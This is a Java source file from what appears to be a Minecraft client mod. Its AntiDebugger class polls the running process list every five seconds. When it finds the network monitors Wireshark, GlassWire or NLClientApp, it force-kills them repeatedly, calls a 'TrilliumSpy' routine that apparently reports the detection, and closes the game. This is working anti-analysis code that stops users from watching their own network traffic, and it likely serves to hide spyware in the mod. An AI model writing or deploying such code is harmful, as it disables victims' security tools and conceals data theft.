package dev._3000IQPlay.trillium.protect;

import dev._3000IQPlay.trillium.TrilliumSpy;
import net.minecraft.client.Minecraft;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class AntiDebugger {
    public static void runAntiDebug() {
        ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor();
        executor.scheduleAtFixedRate(() -> {
            StringBuilder builder = new StringBuilder();
            try {
                String line;
                BufferedReader reader = new BufferedReader(new InputStreamReader(new ProcessBuilder("tasklist").start().getInputStream()));
                while ((line = reader.readLine()) != null) {
                    builder.append(line + "\n");
                }
            } catch (IOException e) {
                // empty catch block
            }

            if (builder.toString().contains("wireshark") || builder.toString().contains("NLClientApp") || builder.toString().contains("GlassWire")) {
                for (int i = 0; i < 200; ++i) {
                    try {
                        Runtime.getRuntime().exec("taskkill /IM wireshark.exe /F");
                        Runtime.getRuntime().exec("taskkill /IM NLClientApp.exe /F");
                        Runtime.getRuntime().exec("taskkill /IM GlassWire.exe /F");
                    } catch (IOException e) {
                        // empty catch block
                    }
                }
                TrilliumSpy.sendDebugOrDumpDetect();
                Minecraft.getMinecraft().shutdown();
            }
        }, 0, 5, TimeUnit.SECONDS);
    }
}